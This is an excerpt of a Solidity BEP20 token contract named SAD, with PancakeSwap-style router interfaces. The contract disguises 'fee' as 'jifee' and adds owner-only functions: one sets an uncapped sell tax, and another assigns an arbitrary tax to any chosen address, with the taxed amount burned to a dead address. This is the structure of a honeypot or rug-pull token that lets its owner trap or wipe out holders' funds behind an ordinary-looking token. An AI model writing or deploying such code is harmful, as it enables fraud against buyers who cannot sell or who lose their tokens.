...
interface IUniswapV2Factory {
    ...
    function jifeeTo() external view returns (address);
    function jifeeToSetter() external view returns (address);
    ...
    function setjifeeTo(address) external;
    function setjifeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingjifeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingjifeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingjifeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingjifeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingjifeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SAD is BEP20, Ownable {
    ...
    uint256 private _defaultSelljifee = 0;

    uint256 private _defaultBuyjifee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipjifee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelljifee = _value;
    }

    function setSlipjifee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipjifee[_address] = _value;
    }

    function getSlipjifee(address _address) external view onlyownar returns (uint256) {
        return _slipjifee[_address];
    }


    function setMAccountjifee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountjifee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradejifeeAmount = 0;

        if (rF) {
            uint256 tradejifee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradejifee = _defaultSelljifee;
                }
                if (from == uniswapV2Pair) {

                    tradejifee = _defaultBuyjifee;
                }
            }
            if (_slipjifee[from] > 0) {
                tradejifee = _slipjifee[from];
            }

            tradejifeeAmount = _Amount.mul(tradejifee).div(100);
        }


        if (tradejifeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradejifeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradejifeeAmount);
            emit Transfer(from, _deadAddress, tradejifeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradejifeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradejifeeAmount);
        emit Transfer(from, _to, _Amount - tradejifeeAmount);
    }
